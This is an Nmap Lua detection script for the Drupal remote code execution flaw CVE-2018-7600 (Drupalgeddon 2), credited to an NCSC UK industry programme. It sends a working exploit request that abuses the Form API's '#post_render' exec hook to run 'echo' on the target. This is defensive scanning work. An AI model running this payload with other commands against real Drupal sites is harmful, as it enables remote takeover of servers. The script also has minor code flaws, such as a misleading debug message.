--
-- Libraries
--
local http = require 'http'
local json = require 'json'
local rand = require 'rand'
local shortport = require 'shortport'
local stdnse = require 'stdnse'
local vulns = require 'vulns'

--
-- Description
--
description = [[

Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code
because of an issue affecting multiple subsystems with default or common module configurations.

The vulnerable component is Drupal's Form API that does not perform sufficiant input sanitation on AJAX requests.

We check for the presence of the vulnerability via:
 - Submitting a POST request to the Form API with a benign payload that returns the CVE name if vulnerable
This check is not intrusive, because:
 - The executed payload returns the CVE name in the response only
 - Does not transmit excessive network traffic
This check may have False Positives if:
 - No known false positive scenarios given this vulnerability
This check may have False Negatives if:
 - No known false negative scenarios given this vulnerability

**Please note, this script has been tested to identify the vulnerability against Drupal 8.5.0 only**

How to use:
  nmap --script drupal-vuln-cve-2018-7600 -p 80,443 --script-args "url=/" <target>

References:
* https://www.drupal.org/sa-core-2018-002
* https://research.checkpoint.com/uncovering-drupalgeddon-2/
]]

--
-- Author
--
author = "Sowdagar Badesha at Riskaware for NCSC UK Industry 100"

--
-- License
---
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

--
-- Categories
--
categories = {"safe", "vuln"}

--
-- The checker function
--
local function check_vuln(vulnin, host, port)

    local vuln = vulnin

    -- https://nmap.org/nsedoc/lib/vulns.html
    vuln.state = vulns.STATE.NOT_VULN

    -- Get the base URL passed in as a parameter.
    local url_param = stdnse.get_script_args('url') or '/'

    -- Construct the url that the request is sent to
    local url = url_param ..
                    'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    local headers = {
        ['Content-Type'] = 'application/x-www-form-urlencoded'
    }
    local data =
        'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo \"CVE-2018-7600"'

    -- Make the POST request to the form API.
    stdnse.debug1('Testing POST request to Druapl form API: %s', url)
    local response = http.post(host, port, url, {
        header = headers
    }, {
        redirect_ok = true,
        no_cache = true
    }, data)

    -- Check if the request returned 200 response.
    if response.status ~= 200 then
        stdnse.debug1('POST request failed with the status "%s".', response.status)
        return vuln
    end

    -- Parse the response body and get the data.
    local json_status, json_data = json.parse(response.body)
    stdnse.debug1('POST request failed with the status "%s".', response.body)
    local data = json_data[1].data

    -- See if the echo command was successfully showing that unsanitised ajax was successfully exected
    if string.match(data, "CVE[-]2018[-]7600") then
        vuln.state = vulns.STATE.VULN
        return vuln
    end
    return vuln
end

--
-- NMAP portrule function
--
portrule = shortport.http

--
-- NMAP action function
--
action = function(host, port)

    -- Definition of the vulnerability
    local vuln = {
        title = 'Drupal 7.x, 8.x remote code execution vulnerability',
        IDS = {
            CVE = 'CVE-2018-7600'
        },
        risk_factor = 'HIGH',
        scores = {
            CVSSv3 = '9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)'
        },
        description = [[
Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows 
remote attackers to execute arbitrary code because of an issue affecting multiple subsystems
with default or common module configurations.
]],
        references = {'https://www.drupal.org/sa-core-2018-002',
                      'https://research.checkpoint.com/uncovering-drupalgeddon-2/'},
        dates = {
            disclosure = {
                year = '2018',
                month = '03',
                day = '18'
            }
        }
    }

    -- Build the report skeleton
    local report = vulns.Report:new(SCRIPT_NAME, host, port)

    -- Check if vulnerable
    local status, err = check_vuln(vuln, host, port)
    if not status then
        return nil
    end

    -- Return it
    return report:make_output(vuln)
end
